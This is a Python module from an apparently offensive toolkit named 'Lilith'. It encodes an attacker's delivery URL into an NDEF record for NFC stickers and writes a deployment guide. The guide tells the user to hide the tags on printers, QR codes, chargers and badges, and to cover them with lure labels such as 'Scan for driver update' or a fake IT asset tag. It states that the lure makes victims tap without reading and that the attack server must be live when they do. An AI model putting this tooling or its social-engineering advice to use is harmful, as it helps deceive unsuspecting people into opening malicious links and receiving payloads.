"""
Lilith — NFC tag NDEF payload generator

Encodes a delivery URL into a binary NDEF URI record ready to flash onto any
NTAG213/215/216 sticker.

Files generated:
  tag.ndef    — raw binary NDEF TLV, write with ndeftool or nfc-mfclassic
  tag_url.txt — plain-text URL + deployment guide
"""

import os
import struct


# ── NDEF URI prefix table (NFC Forum URI RTD v1.0) ───────────────────────────

_URI_PREFIXES = [
    (0x02, "https://www."),
    (0x04, "https://"),
    (0x01, "http://www."),
    (0x03, "http://"),
]


def _ndef_uri_record(url: str) -> bytes:
    """Build a Well-Known URI NDEF record (short record, no ID)."""
    prefix_byte = 0x00
    uri_body    = url
    for code, pfx in _URI_PREFIXES:
        if url.startswith(pfx):
            prefix_byte = code
            uri_body    = url[len(pfx):]
            break

    payload = bytes([prefix_byte]) + uri_body.encode("utf-8")

    # Record header: MB=1 ME=1 CF=0 SR=1 IL=0 TNF=001 (Well Known)
    header   = 0xD1
    type_len = 1
    pay_len  = len(payload)

    if pay_len > 255:
        # Long record — SR=0, 4-byte payload length
        header  = 0xC1
        record  = bytes([header, type_len]) + struct.pack(">I", pay_len) + b"U" + payload
    else:
        record  = bytes([header, type_len, pay_len]) + b"U" + payload

    return record


def _ndef_message_tlv(record: bytes) -> bytes:
    """Wrap NDEF record(s) in the NFC Forum NDEF TLV container."""
    n = len(record)
    if n < 0xFF:
        length_field = bytes([n])
    else:
        # 3-byte length: 0xFF + 2-byte big-endian
        length_field = bytes([0xFF]) + struct.pack(">H", n)

    return bytes([0x03]) + length_field + record + bytes([0xFE])


def _instructions(url: str, ndef_path: str) -> str:
    ndef_name = os.path.basename(ndef_path)
    return f"""\
Lilith NFC tag — deployment guide
══════════════════════════════════════════════════════════════════

URL encoded in tag:
  {url}

NDEF binary: {ndef_name}  ({os.path.getsize(ndef_path)} bytes)
Fits any NTAG213 (144B), NTAG215 (504B), NTAG216 (888B) sticker.

──────────────────────────────────────────────────────────────────
Method 1 — Android / iOS (NFC Tools app, fastest)
──────────────────────────────────────────────────────────────────
  1. Install "NFC Tools" (free, by wakdev) on your phone
  2. Open NFC Tools → Write → Add a record → URL/URI
  3. Paste:  {url}
  4. Tap "Write" → scan sticker

Method 2 — Linux + ndeftool (scriptable)
──────────────────────────────────────────────────────────────────
  pip install ndeftool nfcpy
  ndeftool write {ndef_name}
  # Hold NFC reader over sticker when prompted

Method 3 — libnfc + ACR122U (raw write)
──────────────────────────────────────────────────────────────────
  sudo nfc-mfclassic W a u {ndef_name}
  # (for Mifare Classic tags — NTAG use ndeftool instead)

Method 4 — Flipper Zero
──────────────────────────────────────────────────────────────────
  Flipper → NFC → Detect Reader → hold over sticker
  Or use qFlipper to write .nfc dump with NDEF payload.

──────────────────────────────────────────────────────────────────
Physical deployment tips
──────────────────────────────────────────────────────────────────
  HIGH VALUE locations (targets tap without thinking):
    • Over/under a QR code ("Scan here too")
    • On a printer or copier ("Tap to connect")
    • On a conference room TV/projector remote
    • On a charging pad or USB-C hub on a desk
    • Inside a visitor badge or lanyard badge holder

  LABEL IDEAS (print small sticker over the NFC sticker):
    • "Wi-Fi → Tap to connect"
    • "Scan for driver update"
    • "Tap to download meeting agenda"
    • "Asset tag — IT Dept."

  NOTE: Android shows "Open link?" notification — victim must tap once.
        iOS 14+ shows URL preview before opening.
        The lure label makes them tap without reading carefully.

──────────────────────────────────────────────────────────────────
Server must be running when victim taps:
  lilith serve
──────────────────────────────────────────────────────────────────
"""


def build_nfc_payload(url: str, output_dir: str) -> bool:
    """Generate NDEF binary + deployment guide for an NFC tag.

    url        : full URL to encode (https://lhost:port/android/ by default)
    output_dir : directory to write tag.ndef and tag_url.txt into
    """
    os.makedirs(output_dir, exist_ok=True)

    record   = _ndef_uri_record(url)
    tlv      = _ndef_message_tlv(record)

    ndef_path = os.path.join(output_dir, "tag.ndef")
    txt_path  = os.path.join(output_dir, "tag_url.txt")

    with open(ndef_path, "wb") as f:
        f.write(tlv)

    guide = _instructions(url, ndef_path)
    with open(txt_path, "w") as f:
        f.write(guide)

    print(f"[+] {ndef_path}  ({len(tlv)} bytes NDEF TLV)")
    print(f"[+] {txt_path}")
    print()
    print(f"[*] URL  : {url}")
    print(f"[*] Tag  : {len(tlv)} bytes — fits NTAG213 (144B) and larger")
    print()
    print("[*] Write with NFC Tools app (Android/iOS): paste URL → Write → scan sticker")
    print(f"    OR: ndeftool write {ndef_path}")
    print()
    print("[*] Server must be live when victim taps: lilith serve")

    return True
